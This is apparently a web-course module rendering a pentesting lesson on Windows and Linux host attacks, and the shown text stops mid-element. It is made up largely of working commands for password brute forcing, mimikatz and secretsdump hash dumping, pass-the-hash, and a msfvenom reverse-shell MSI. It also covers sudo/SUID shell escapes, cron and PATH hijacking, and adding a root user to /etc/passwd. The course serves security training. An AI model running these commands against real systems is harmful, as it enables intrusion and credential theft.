// ============================================
// Host & Network Pentesting: System/Host-Based Attacks
// ============================================

export function render() {
  return `
<article class="lesson">
  <div class="lesson-header">
    <div class="lesson-section-tag">Host & Network Pentesting</div>
    <h1 class="lesson-title">System/Host-Based Attacks</h1>
    <div class="lesson-meta">
      <span>⏱ ~55 min</span>
      <span>⚡ 150 XP</span>
      <span>📚 Core</span>
    </div>
  </div>

  <div class="story-intro">
    You found an open SMB share during enumeration. Inside was a backup file containing a username and a weak password. You used it to get a low-privilege shell on a Windows box. Thirty minutes later, you had dumped every NTLM hash on the domain controller, passed them to every machine in the network, and owned the entire Active Directory forest. The client's "secure network" fell — not because of some exotic zero-day, but because of a misconfigured service, a reused password, and a SAM database that nobody thought to protect. This section teaches you how that chain works.
  </div>

  <!-- ==================== SECTION 1: Overview ==================== -->
  <h2>Overview: Attacking the Host</h2>

  <p>You've gotten initial access — maybe a shell through an exploit, maybe valid credentials from OSINT. Now what? The machine you're on is rarely the final target. You need to <strong>escalate privileges</strong>, <strong>dump credentials</strong>, and <strong>move laterally</strong> to other systems. This is where system/host-based attacks come in.</p>

  <div class="key-point">
    The post-exploitation flow: <strong>Initial Access → Privilege Escalation → Credential Harvesting → Lateral Movement → Objective</strong>. Every technique in this section fits into one of those phases.
  </div>

  <p>We'll cover attacks on both Windows and Linux hosts, plus password cracking fundamentals that apply to both.</p>

  <!-- ==================== SECTION 2: Windows Password Attacks ==================== -->
  <h2>Windows Attacks: Password Brute Forcing</h2>

  <p>The simplest way into a system: guess the password. Brute force attacks try many username/password combinations against a service until one works.</p>

  <h3>Hydra — The Go-To Brute Force Tool</h3>

  <div class="code-block">
    <span class="code-label">Hydra — Brute Force Examples</span>
<span class="comment"># Brute force RDP</span>
<span class="cmd">hydra</span> <span class="flag">-l</span> <span class="val">administrator</span> <span class="flag">-P</span> <span class="val">/usr/share/wordlists/rockyou.txt</span> <span class="flag">rdp://</span><span class="val">10.10.10.5</span>

<span class="comment"># Brute force SMB</span>
<span class="cmd">hydra</span> <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">/usr/share/wordlists/rockyou.txt</span> <span class="val">10.10.10.5</span> <span class="flag">smb</span>

<span class="comment"># Brute force SSH</span>
<span class="cmd">hydra</span> <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">passwords.txt</span> <span class="val">10.10.10.5</span> <span class="flag">ssh</span>

<span class="comment"># Brute force HTTP login form</span>
<span class="cmd">hydra</span> <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">rockyou.txt</span> <span class="val">10.10.10.5</span> <span class="flag">http-post-form</span> <span class="val">"/login:user=^USER^&pass=^PASS^:Invalid"</span>
  </div>

  <div class="hacker-note">
    <code>-l</code> = single username, <code>-L</code> = username list. <code>-p</code> = single password, <code>-P</code> = password list. <code>rockyou.txt</code> has 14 million passwords from a real data breach — it's your first wordlist to try, every time.
  </div>

  <div class="warning">
    Brute forcing is LOUD. Account lockouts can deny you access and alert the blue team. Always check the lockout policy first. In real pentests, try 2-3 common passwords before going full wordlist.
  </div>

  <!-- ==================== SECTION 3: Windows Credential Storage ==================== -->
  <h2>Windows Credential Storage</h2>

  <p>To attack Windows credentials, you need to understand where and how they're stored.</p>

  <h3>The SAM Database</h3>
  <p>The <strong>Security Account Manager (SAM)</strong> stores local user account password hashes. It lives at <code>C:\\Windows\\System32\\config\\SAM</code> and is locked while Windows is running.</p>

  <h3>NTLM Hashes</h3>
  <p>Windows doesn't store passwords in plaintext. It stores <strong>NTLM hashes</strong> — a one-way hash of the password. The critical thing: <strong>NTLM hashes have no salt</strong>, which means the same password always produces the same hash, making them vulnerable to rainbow tables and pass-the-hash attacks.</p>

  <table class="port-table">
    <thead>
      <tr><th>Component</th><th>Location</th><th>What It Stores</th></tr>
    </thead>
    <tbody>
      <tr><td><strong>SAM</strong></td><td>C:\\Windows\\System32\\config\\SAM</td><td>Local user NTLM hashes</td></tr>
      <tr><td><strong>SYSTEM</strong></td><td>C:\\Windows\\System32\\config\\SYSTEM</td><td>Boot key to decrypt SAM</td></tr>
      <tr><td><strong>LSA Secrets</strong></td><td>Registry (HKLM\\SECURITY)</td><td>Cached domain creds, service account passwords</td></tr>
      <tr><td><strong>NTDS.dit</strong></td><td>Domain Controller only</td><td>ALL domain user hashes — the crown jewel</td></tr>
      <tr><td><strong>LSASS Process</strong></td><td>Memory (lsass.exe)</td><td>Currently logged-in users' hashes and tickets</td></tr>
    </tbody>
  </table>

  <div class="analogy">
    Think of SAM as the local guest book — it only has info about users on that one machine. NTDS.dit is the master directory for the entire company — every employee, every password hash, every domain account. If you get NTDS.dit, you own the domain.
  </div>

  <!-- ==================== SECTION 4: Dumping Hashes ==================== -->
  <h2>Dumping Hashes</h2>

  <p>Once you have elevated privileges on a Windows machine, you can extract password hashes from memory or disk.</p>

  <div class="code-block">
    <span class="code-label">Meterpreter — hashdump</span>
<span class="comment"># Inside a Meterpreter session with SYSTEM privileges</span>
<span class="cmd">meterpreter ></span> <span class="val">hashdump</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="flag">e02bc503339d51f71d913c245d35b50b</span>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

<span class="comment"># The format is: Username:RID:LM_Hash:NTLM_Hash:::</span>
<span class="comment"># The NTLM hash (after the 3rd colon) is what you want</span>
  </div>

  <div class="code-block">
    <span class="code-label">Mimikatz — The King of Credential Theft</span>
<span class="comment"># Run mimikatz (requires admin/SYSTEM)</span>
<span class="cmd">mimikatz #</span> <span class="val">privilege::debug</span>
<span class="cmd">mimikatz #</span> <span class="val">sekurlsa::logonpasswords</span>

<span class="comment"># This dumps cleartext passwords, NTLM hashes, and Kerberos tickets</span>
<span class="comment"># from the LSASS process memory</span>

<span class="comment"># Dump SAM database</span>
<span class="cmd">mimikatz #</span> <span class="val">lsadump::sam</span>

<span class="comment"># Dump LSA secrets</span>
<span class="cmd">mimikatz #</span> <span class="val">lsadump::secrets</span>
  </div>

  <div class="code-block">
    <span class="code-label">Impacket secretsdump — Remote Hash Dumping</span>
<span class="comment"># Dump hashes remotely with valid credentials</span>
<span class="cmd">secretsdump.py</span> <span class="val">administrator</span>:<span class="val">Password123</span>@<span class="val">10.10.10.5</span>

<span class="comment"># Dump hashes using an NTLM hash (pass-the-hash)</span>
<span class="cmd">secretsdump.py</span> <span class="flag">-hashes</span> <span class="val">aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b</span> <span class="val">administrator</span>@<span class="val">10.10.10.5</span>

<span class="comment"># Dump NTDS.dit from a Domain Controller</span>
<span class="cmd">secretsdump.py</span> <span class="val">DOMAIN/administrator</span>:<span class="val">Password123</span>@<span class="val">10.10.10.1</span> <span class="flag">-just-dc-ntlm</span>
  </div>

  <div class="key-point">
    <strong>The hash dumping hierarchy:</strong> hashdump (quick and easy in Meterpreter), mimikatz (most powerful, gets cleartext from memory), secretsdump (works remotely, great for domain controllers).
  </div>

  <!-- ==================== SECTION 5: Pass-the-Hash ==================== -->
  <h2>Pass-the-Hash (PtH)</h2>

  <p>Here's the beautiful thing about NTLM: you don't need to crack the hash. Windows authentication accepts the hash itself as proof of identity. If you have the NTLM hash, you can authenticate as that user without ever knowing their password.</p>

  <div class="code-block">
    <span class="code-label">Pass-the-Hash Examples</span>
<span class="comment"># PsExec with hash — get a shell</span>
<span class="cmd">psexec.py</span> <span class="flag">-hashes</span> <span class="val">aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b</span> <span class="val">administrator</span>@<span class="val">10.10.10.5</span>

<span class="comment"># CrackMapExec — spray a hash across multiple hosts</span>
<span class="cmd">crackmapexec</span> <span class="flag">smb</span> <span class="val">10.10.10.0/24</span> <span class="flag">-u</span> <span class="val">administrator</span> <span class="flag">-H</span> <span class="val">e02bc503339d51f71d913c245d35b50b</span>

<span class="comment"># Evil-WinRM with hash</span>
<span class="cmd">evil-winrm</span> <span class="flag">-i</span> <span class="val">10.10.10.5</span> <span class="flag">-u</span> <span class="val">administrator</span> <span class="flag">-H</span> <span class="val">e02bc503339d51f71d913c245d35b50b</span>

<span class="comment"># Metasploit psexec module</span>
<span class="cmd">use</span> <span class="val">exploit/windows/smb/psexec</span>
<span class="cmd">set</span> SMBUser <span class="val">administrator</span>
<span class="cmd">set</span> SMBPass <span class="val">aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b</span>
  </div>

  <div class="hacker-note">
    Pass-the-Hash is one of the most devastating techniques in Windows pentesting. Compromise one admin, dump hashes, and if the local Administrator password is reused across machines (extremely common), you can laterally move to every single host on the network.
  </div>

  <!-- ==================== SECTION 6: Token Impersonation ==================== -->
  <h2>Token Impersonation</h2>

  <p>Every process on Windows runs with a <strong>security token</strong> — it defines who that process is running as and what privileges it has. If a high-privilege user has a process running on a machine you've compromised, you can steal their token.</p>

  <div class="code-block">
    <span class="code-label">Meterpreter Incognito — Token Theft</span>
<span class="comment"># Load the incognito module</span>
<span class="cmd">meterpreter ></span> <span class="val">load incognito</span>

<span class="comment"># List available tokens</span>
<span class="cmd">meterpreter ></span> <span class="val">list_tokens -u</span>

<span class="comment"># Impersonate a domain admin token</span>
<span class="cmd">meterpreter ></span> <span class="val">impersonate_token "CORP\\\\domain_admin"</span>

<span class="comment"># Verify who you are now</span>
<span class="cmd">meterpreter ></span> <span class="val">getuid</span>
Server username: CORP\\domain_admin
  </div>

  <div class="analogy">
    Tokens are like VIP badges. If a Domain Admin walked through your compromised machine (logged in remotely, accessed a share, ran a service), they left their badge behind. Incognito lets you pick up that badge and wear it — now the system treats you as that admin.
  </div>

  <div class="key-point">
    There are two types of tokens: <strong>Delegation tokens</strong> (created for interactive logins — RDP, console) and <strong>Impersonation tokens</strong> (created for non-interactive sessions — accessing a network share). Both can be stolen.
  </div>

  <!-- ==================== SECTION 7: UAC Bypass ==================== -->
  <h2>UAC Bypass</h2>

  <p><strong>User Account Control (UAC)</strong> is Windows' "Are you sure?" prompt that pops up when you try to do something administrative. Even if you have an admin account, UAC restricts your token to standard privileges until you explicitly elevate.</p>

  <p>UAC bypass techniques exploit trusted Windows binaries (auto-elevating programs) to run your code with full admin privileges without triggering the UAC prompt.</p>

  <div class="code-block">
    <span class="code-label">UAC Bypass — Metasploit</span>
<span class="comment"># Common UAC bypass modules in Metasploit</span>
<span class="cmd">use</span> <span class="val">exploit/windows/local/bypassuac_eventvwr</span>
<span class="cmd">set</span> SESSION <span class="val">1</span>
<span class="cmd">run</span>

<span class="comment"># Other bypass modules:</span>
<span class="comment"># exploit/windows/local/bypassuac_fodhelper</span>
<span class="comment"># exploit/windows/local/bypassuac_comhijack</span>
  </div>

  <div class="warning">
    UAC bypass only works if your user is already in the Administrators group but running with a filtered (medium-integrity) token. It does NOT escalate a standard user to admin — it unlocks admin rights that UAC is suppressing.
  </div>

  <!-- ==================== SECTION 8: Windows Privilege Escalation ==================== -->
  <h2>Windows Privilege Escalation</h2>

  <p>You have a low-privilege shell. You need SYSTEM. Here are the most common paths to escalation on Windows.</p>

  <h3>1. Service Misconfigurations</h3>
  <p>Windows services run as SYSTEM by default. If you can modify a service's binary path or replace its executable, you can get code execution as SYSTEM.</p>

  <div class="code-block">
    <span class="code-label">Exploiting Weak Service Permissions</span>
<span class="comment"># Find services with weak permissions</span>
<span class="cmd">accesschk.exe</span> <span class="flag">/accepteula -uwcqv</span> <span class="val">"Authenticated Users"</span> *

<span class="comment"># If you can modify a service config:</span>
<span class="cmd">sc config</span> <span class="val">vulnerable_service</span> <span class="flag">binpath=</span> <span class="val">"C:\\Users\\Public\\shell.exe"</span>
<span class="cmd">sc stop</span> <span class="val">vulnerable_service</span>
<span class="cmd">sc start</span> <span class="val">vulnerable_service</span>
<span class="comment"># Your shell.exe now runs as SYSTEM</span>
  </div>

  <h3>2. Unquoted Service Paths</h3>
  <p>When a service path contains spaces and isn't quoted, Windows tries multiple interpretations:</p>

  <div class="code-block">
    <span class="code-label">Unquoted Service Path Exploitation</span>
<span class="comment"># Service path: C:\\Program Files\\My App\\service.exe</span>
<span class="comment"># Windows tries (in order):</span>
<span class="comment">#   C:\\Program.exe</span>
<span class="comment">#   C:\\Program Files\\My.exe</span>
<span class="comment">#   C:\\Program Files\\My App\\service.exe</span>

<span class="comment"># Find unquoted service paths:</span>
<span class="cmd">wmic</span> service get name,displayname,pathname,startmode | <span class="cmd">findstr</span> /i "auto" | <span class="cmd">findstr</span> /i /v "C:\\Windows\\\\" | <span class="cmd">findstr</span> /i /v """

<span class="comment"># Drop your payload at one of the intermediate paths</span>
<span class="comment"># e.g., place shell.exe as C:\\Program Files\\My.exe</span>
  </div>

  <h3>3. DLL Hijacking</h3>
  <p>When a program loads a DLL, Windows searches directories in a specific order. If a program tries to load a DLL that doesn't exist, you can place a malicious DLL in the search path.</p>

  <div class="hacker-note">
    Windows DLL search order: (1) application directory, (2) system directory, (3) 16-bit system directory, (4) Windows directory, (5) current directory, (6) PATH directories. If you can write to any of these before the real DLL is found, you win.
  </div>

  <h3>4. AlwaysInstallElevated</h3>
  <p>If both of these registry keys are set to <code>1</code>, ANY user can install MSI packages with SYSTEM privileges:</p>

  <div class="code-block">
    <span class="code-label">AlwaysInstallElevated Check & Exploit</span>
<span class="comment"># Check if AlwaysInstallElevated is enabled</span>
<span class="cmd">reg query</span> <span class="val">HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</span> <span class="flag">/v AlwaysInstallElevated</span>
<span class="cmd">reg query</span> <span class="val">HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</span> <span class="flag">/v AlwaysInstallElevated</span>

<span class="comment"># If both return 0x1 — generate a malicious MSI</span>
<span class="cmd">msfvenom</span> <span class="flag">-p</span> <span class="val">windows/meterpreter/reverse_tcp</span> LHOST=<span class="val">10.10.10.100</span> LPORT=<span class="val">4444</span> <span class="flag">-f msi</span> <span class="flag">-o</span> <span class="val">evil.msi</span>

<span class="comment"># Install it on the target — runs as SYSTEM</span>
<span class="cmd">msiexec</span> <span class="flag">/quiet /qn /i</span> <span class="val">C:\\Temp\\evil.msi</span>
  </div>

  <div class="try-it">
    <p>Windows PrivEsc enumeration commands to memorize:</p>
    <button class="try-cmd">whoami /priv</button>
    <button class="try-cmd">systeminfo</button>
    <button class="try-cmd">net localgroup administrators</button>
    <button class="try-cmd">wmic service get name,pathname,startmode</button>
  </div>

  <!-- ==================== SECTION 9: Important Windows Files ==================== -->
  <h2>Important Windows Files to Look For</h2>

  <table class="port-table">
    <thead>
      <tr><th>File</th><th>Location</th><th>Why It Matters</th></tr>
    </thead>
    <tbody>
      <tr><td><strong>SAM</strong></td><td>C:\\Windows\\System32\\config\\SAM</td><td>Local password hashes</td></tr>
      <tr><td><strong>SYSTEM</strong></td><td>C:\\Windows\\System32\\config\\SYSTEM</td><td>Boot key needed to decrypt SAM</td></tr>
      <tr><td><strong>NTDS.dit</strong></td><td>C:\\Windows\\NTDS\\NTDS.dit</td><td>All domain hashes (DC only)</td></tr>
      <tr><td><strong>web.config</strong></td><td>C:\\inetpub\\wwwroot\\web.config</td><td>Database connection strings, credentials</td></tr>
      <tr><td><strong>unattend.xml</strong></td><td>C:\\Windows\\Panther\\unattend.xml</td><td>Deployment passwords (often base64-encoded)</td></tr>
      <tr><td><strong>hosts</strong></td><td>C:\\Windows\\System32\\drivers\\etc\\hosts</td><td>Internal hostnames and IPs</td></tr>
    </tbody>
  </table>

  <div class="hacker-note">
    Always check <code>unattend.xml</code> and <code>web.config</code> early. System admins forget these files contain credentials. The passwords in unattend.xml are often just base64-encoded — not encrypted, just encoded. One decode and you have the admin password.
  </div>

  <!-- ==================== SECTION 10: Linux Credential Storage ==================== -->
  <h2>Linux Attacks: Credential Storage</h2>

  <p>Linux stores user information in two critical files:</p>

  <div class="code-block">
    <span class="code-label">/etc/passwd — User Accounts (World-Readable)</span>
<span class="comment"># Format: username:x:UID:GID:comment:home:shell</span>
root:<span class="flag">x</span>:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Admin User:/home/admin:/bin/bash

<span class="comment"># The "x" means the password hash is in /etc/shadow</span>
<span class="comment"># If there's a hash HERE instead of "x", you can crack it directly</span>
<span class="comment"># UID 0 = root. If you can add a UID 0 user, you have root.</span>
  </div>

  <div class="code-block">
    <span class="code-label">/etc/shadow — Password Hashes (Root Only)</span>
<span class="comment"># Format: username:hash:lastchanged:min:max:warn:inactive:expire</span>
root:<span class="flag">$6$rounds=5000$salt$hashvalue</span>:18900:0:99999:7:::
admin:<span class="flag">$6$xyz$longhashhere</span>:18950:0:99999:7:::

<span class="comment"># $6$ = SHA-512 (most common on modern Linux)</span>
<span class="comment"># $5$ = SHA-256</span>
<span class="comment"># $1$ = MD5 (old, weak)</span>
<span class="comment"># $y$ or $2b$ = yescrypt/bcrypt</span>
  </div>

  <div class="key-point">
    If you can read <code>/etc/shadow</code>, you can extract and crack password hashes offline. If <code>/etc/passwd</code> is writable, you can add a root user or replace the "x" with a known hash — instant root.
  </div>

  <!-- ==================== SECTION 11: Linux Password Cracking ==================== -->
  <h2>Password Cracking: John & Hashcat</h2>

  <div class="code-block">
    <span class="code-label">John the Ripper</span>
<span class="comment"># Combine passwd and shadow for John</span>
<span class="cmd">unshadow</span> <span class="val">/etc/passwd</span> <span class="val">/etc/shadow</span> > <span class="val">hashes.txt</span>

<span class="comment"># Crack with a wordlist</span>
<span class="cmd">john</span> <span class="val">hashes.txt</span> <span class="flag">--wordlist=</span><span class="val">/usr/share/wordlists/rockyou.txt</span>

<span class="comment"># Show cracked passwords</span>
<span class="cmd">john</span> <span class="flag">--show</span> <span class="val">hashes.txt</span>
  </div>

  <div class="code-block">
    <span class="code-label">Hashcat — GPU-Accelerated Cracking</span>
<span class="comment"># Crack NTLM hashes</span>
<span class="cmd">hashcat</span> <span class="flag">-m 1000</span> <span class="val">ntlm_hashes.txt</span> <span class="val">/usr/share/wordlists/rockyou.txt</span>

<span class="comment"># Crack Linux SHA-512 hashes</span>
<span class="cmd">hashcat</span> <span class="flag">-m 1800</span> <span class="val">shadow_hashes.txt</span> <span class="val">rockyou.txt</span>

<span class="comment"># Crack MD5 hashes</span>
<span class="cmd">hashcat</span> <span class="flag">-m 0</span> <span class="val">md5_hashes.txt</span> <span class="val">rockyou.txt</span>
  </div>

  <h3>Hash Types & Hashcat Modes</h3>
  <table class="port-table">
    <thead>
      <tr><th>Hash Type</th><th>Hashcat Mode (-m)</th><th>Example / Identifier</th></tr>
    </thead>
    <tbody>
      <tr><td><strong>MD5</strong></td><td class="port-num">0</td><td>32 hex chars: 5d41402abc4b2a76...</td></tr>
      <tr><td><strong>SHA1</strong></td><td class="port-num">100</td><td>40 hex chars</td></tr>
      <tr><td><strong>SHA256</strong></td><td class="port-num">1400</td><td>64 hex chars</td></tr>
      <tr><td><strong>SHA512</strong></td><td class="port-num">1700</td><td>128 hex chars</td></tr>
      <tr><td><strong>NTLM</strong></td><td class="port-num">1000</td><td>32 hex chars (Windows)</td></tr>
      <tr><td><strong>sha512crypt ($6$)</strong></td><td class="port-num">1800</td><td>Linux /etc/shadow</td></tr>
      <tr><td><strong>bcrypt ($2b$)</strong></td><td class="port-num">3200</td><td>Web apps, very slow to crack</td></tr>
      <tr><td><strong>md5crypt ($1$)</strong></td><td class="port-num">500</td><td>Old Linux systems</td></tr>
    </tbody>
  </table>

  <div class="hacker-note">
    <strong>Quick decision tree:</strong> Got a GPU? Use Hashcat. CPU only? Use John. Need it done in 5 seconds? Try CrackStation.net or hashes.com first — they have massive rainbow table databases.
  </div>

  <h3>Attack Methods Compared</h3>
  <table class="port-table">
    <thead>
      <tr><th>Method</th><th>Speed</th><th>Effectiveness</th><th>How It Works</th></tr>
    </thead>
    <tbody>
      <tr><td><strong>Dictionary</strong></td><td>Fast</td><td>Great for weak passwords</td><td>Tries every word in a wordlist (rockyou.txt)</td></tr>
      <tr><td><strong>Brute Force</strong></td><td>Very slow</td><td>Guaranteed (given time)</td><td>Tries every possible combination (a-z, 0-9...)</td></tr>
      <tr><td><strong>Rainbow Tables</strong></td><td>Instant lookup</td><td>Fails against salted hashes</td><td>Pre-computed hash-to-password database</td></tr>
      <tr><td><strong>Rule-Based</strong></td><td>Moderate</td><td>Catches variations</td><td>Applies rules: password → P@ssw0rd, Password1!</td></tr>
    </tbody>
  </table>

  <!-- ==================== SECTION 12: Linux Privilege Escalation ==================== -->
  <h2>Linux Privilege Escalation</h2>

  <p>You have a low-privilege shell on a Linux box. Here are the most common roads to root.</p>

  <h3>1. SUID Binaries</h3>
  <p>A binary with the SUID bit set runs as its <strong>owner</strong> regardless of who executes it. If root owns a SUID binary that you can abuse, you get root.</p>

  <div class="code-block">
    <span class="code-label">Finding and Exploiting SUID Binaries</span>
<span class="comment"># Find all SUID binaries</span>
<span class="cmd">find</span> <span class="val">/</span> <span class="flag">-perm -4000</span> <span class="flag">-type f</span> 2>/dev/null

<span class="comment"># Common exploitable SUID binaries (check GTFOBins!):</span>
<span class="comment"># /usr/bin/find    → find . -exec /bin/sh -p \\;</span>
<span class="comment"># /usr/bin/vim     → vim -c ':!/bin/sh'</span>
<span class="comment"># /usr/bin/python  → python -c 'import os; os.execl("/bin/sh","sh","-p")'</span>
<span class="comment"># /usr/bin/bash    → bash -p</span>
<span class="comment"># /usr/bin/nmap    → nmap --interactive → !sh (old versions)</span>
  </div>

  <div class="key-point">
    <strong>GTFOBins</strong> (<a href="https://gtfobins.github.io" target="_blank">gtfobins.github.io</a>) is your cheat sheet. Found a weird SUID binary? Search it on GTFOBins to see if it can be abused for privilege escalation, file reads, or shell escapes.
  </div>

  <h3>2. Sudo Misconfigurations</h3>

  <div class="code-block">
    <span class="code-label">Exploiting sudo</span>
<span class="comment"># Check what you can run as root</span>
<span class="cmd">sudo -l</span>

<span class="comment"># Examples of exploitable sudo entries:</span>
<span class="comment"># (root) NOPASSWD: /usr/bin/vim</span>
<span class="cmd">sudo vim</span> <span class="flag">-c ':!/bin/bash'</span>

<span class="comment"># (root) NOPASSWD: /usr/bin/find</span>
<span class="cmd">sudo find</span> <span class="val">.</span> <span class="flag">-exec /bin/sh \\;</span>

<span class="comment"># (root) NOPASSWD: /usr/bin/python3</span>
<span class="cmd">sudo python3</span> <span class="flag">-c 'import os; os.system("/bin/bash")'</span>

<span class="comment"># (root) NOPASSWD: /usr/bin/env</span>
<span class="cmd">sudo env</span> <span class="val">/bin/bash</span>
  </div>

  <h3>3. Cron Jobs</h3>
  <p>If a cron job runs a script as root, and you can <strong>modify that script</strong>, you can inject commands that execute as root.</p>

  <div class="code-block">
    <span class="code-label">Exploiting Cron Jobs</span>
<span class="comment"># Check system crontabs</span>
<span class="cmd">cat</span> <span class="val">/etc/crontab</span>
<span class="cmd">ls -la</span> <span class="val">/etc/cron.d/</span>
<span class="cmd">crontab -l</span>

<span class="comment"># Example: crontab runs /opt/backup.sh as root every minute</span>
<span class="comment"># * * * * * root /opt/backup.sh</span>
<span class="comment"># If /opt/backup.sh is writable by your user:</span>
<span class="cmd">echo</span> <span class="val">'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'</span> >> <span class="val">/opt/backup.sh</span>
<span class="comment"># Wait 60 seconds, then:</span>
<span class="cmd">/tmp/rootbash -p</span>
  </div>

  <h3>4. Kernel Exploits</h3>

  <div class="code-block">
    <span class="code-label">Kernel Exploitation</span>
<span class="comment"># Check kernel version</span>
<span class="cmd">uname -a</span>
<span class="cmd">cat</span> <span class="val">/etc/os-release</span>

<span class="comment"># Run linux-exploit-suggester</span>
<span class="cmd">./linux-exploit-suggester.sh</span>

<span class="comment"># Famous kernel exploits:</span>
<span class="comment"># DirtyPipe (CVE-2022-0847) — Linux 5.8+</span>
<span class="comment"># DirtyCow (CVE-2016-5195) — Linux 2.x-4.x</span>
<span class="comment"># PwnKit (CVE-2021-4034) — pkexec, almost universal</span>
  </div>

  <div class="warning">
    Kernel exploits can crash the system. On a real pentest, get written permission before running them. On the eJPT exam, they're fair game — just make sure you match the exploit to the kernel version.
  </div>

  <h3>5. PATH Injection</h3>
  <p>If a privileged script calls a command without its full path (e.g., <code>service</code> instead of <code>/usr/sbin/service</code>), you can create a malicious binary with the same name earlier in the PATH.</p>

  <div class="code-block">
    <span class="code-label">PATH Injection</span>
<span class="comment"># A root-owned script calls "curl" without full path</span>
<span class="comment"># Create a fake "curl" in /tmp</span>
<span class="cmd">echo</span> <span class="val">'#!/bin/bash\n/bin/bash'</span> > <span class="val">/tmp/curl</span>
<span class="cmd">chmod +x</span> <span class="val">/tmp/curl</span>

<span class="comment"># Prepend /tmp to your PATH</span>
<span class="cmd">export</span> <span class="val">PATH=/tmp:$PATH</span>

<span class="comment"># Now when the script runs "curl", it executes YOUR version</span>
  </div>

  <h3>6. Writable /etc/passwd</h3>

  <div class="code-block">
    <span class="code-label">Adding a Root User via /etc/passwd</span>
<span class="comment"># Generate a password hash</span>
<span class="cmd">openssl passwd</span> <span class="flag">-1</span> <span class="val">-salt abc</span> <span class="val">password123</span>

<span class="comment"># Append a new root user to /etc/passwd</span>
<span class="cmd">echo</span> <span class="val">'hacker:$1$abc$hashedvalue:0:0:root:/root:/bin/bash'</span> >> <span class="val">/etc/passwd</span>

<span class="comment"># Now login as your new root user</span>
<span class="cmd">su hacker</span>
<span class="comment"># Password: password123 → you are root</span>
  </div>

  <h3>7. Linux Capabilities</h3>
  <p>Capabilities are fine-grained privileges assigned to binaries. Some are as dangerous as SUID root.</p>

  <div class="code-block">
    <span class="code-label">Exploiting Capabilities</span>
<span class="comment"># Find binaries with capabilities</span>
<span class="cmd">getcap</span> <span class="flag">-r</span> <span class="val">/</span> 2>/dev/null

<span class="comment"># Dangerous capabilities:</span>
<span class="comment"># cap_setuid+ep on python3 → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span>
<span class="comment"># cap_dac_read_search+ep → can read any file (including /etc/shadow)</span>
<span class="comment"># cap_net_raw+ep → can sniff network traffic</span>
  </div>

  <div class="try-it">
    <p>Linux PrivEsc enumeration — run these first, every time:</p>
    <button class="try-cmd">whoami && id</button>
    <button class="try-cmd">sudo -l</button>
    <button class="try-cmd">find / -perm -4000 -type f 2>/dev/null</button>
    <button class="try-cmd">cat /etc/crontab</button>
    <button class="try-cmd">uname -a</button>
    <button class="try-cmd">getcap -r / 2>/dev/null</button>
  </div>

  <!-- ==================== SECTION 13: Important Linux Files ==================== -->
  <h2>Important Linux Files to Check</h2>

  <table class="port-table">
    <thead>
      <tr><th>File</th><th>Why It Matters</th></tr>
    </thead>
    <tbody>
      <tr><td><strong>/etc/passwd</strong></td><td>User accounts — check if writable for instant root</td></tr>
      <tr><td><strong>/etc/shadow</strong></td><td>Password hashes — extract and crack offline</td></tr>
      <tr><td><strong>/etc/crontab</strong></td><td>Scheduled tasks — look for writable scripts run as root</td></tr>
      <tr><td><strong>/etc/sudoers</strong></td><td>Sudo permissions — what can your user run as root?</td></tr>
      <tr><td><strong>/root/.ssh/</strong></td><td>Root's SSH keys — id_rsa gives you persistent root access</td></tr>
      <tr><td><strong>/home/*/.ssh/</strong></td><td>User SSH keys — lateral movement to other systems</td></tr>
      <tr><td><strong>/home/*/.bash_history</strong></td><td>Command history — may contain passwords typed as args</td></tr>
      <tr><td><strong>/etc/hosts</strong></td><td>Internal hostnames and IPs — reveals network topology</td></tr>
      <tr><td><strong>/var/www/html/</strong></td><td>Web root — config files often contain DB credentials</td></tr>
      <tr><td><strong>/opt/, /tmp/, /var/backups/</strong></td><td>Common locations for scripts, backups, and creds</td></tr>
    </tbody>
  </table>

  <!-- ==================== SECTION 14: Credential Harvesting ==================== -->
  <h2>Credential Harvesting: Where Passwords Hide</h2>

  <p>Beyond the standard hash locations, credentials are scattered everywhere on a compromised system. Knowing where to look separates a script kiddie from a pentester.</p>

  <h3>Common Credential Locations</h3>

  <div class="code-block">
    <span class="code-label">Hunting for Credentials</span>
<span class="comment"># Search for files containing "password" (Linux)</span>
<span class="cmd">grep</span> <span class="flag">-rnw</span> <span class="val">/</span> <span class="flag">-e</span> <span class="val">"password"</span> <span class="flag">--include="*.{txt,xml,ini,conf,cfg,php,py,sh}"</span> 2>/dev/null

<span class="comment"># Search for config files</span>
<span class="cmd">find</span> <span class="val">/</span> <span class="flag">-name</span> <span class="val">"*.conf"</span> <span class="flag">-o -name</span> <span class="val">"*.config"</span> <span class="flag">-o -name</span> <span class="val">"*.ini"</span> 2>/dev/null

<span class="comment"># Check environment variables</span>
<span class="cmd">env</span>
<span class="cmd">cat</span> <span class="val">/proc/*/environ</span> 2>/dev/null

<span class="comment"># Check bash history for all users</span>
<span class="cmd">cat</span> <span class="val">/home/*/.bash_history</span> 2>/dev/null

<span class="comment"># Database config files</span>
<span class="cmd">cat</span> <span class="val">/var/www/html/wp-config.php</span>        <span class="comment"># WordPress</span>
<span class="cmd">cat</span> <span class="val">/var/www/html/configuration.php</span>     <span class="comment"># Joomla</span>
<span class="cmd">cat</span> <span class="val">/var/www/html/.env</span>                  <span class="comment"># Laravel/Node apps</span>

<span class="comment"># Windows: search for stored credentials</span>
<span class="cmd">cmdkey /list</span>
<span class="cmd">dir</span> <span class="val">C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\</span>
<span class="cmd">findstr</span> <span class="flag">/si</span> <span class="val">"password"</span> <span class="val">*.xml *.ini *.txt *.config</span>
  </div>

  <div class="hacker-note">
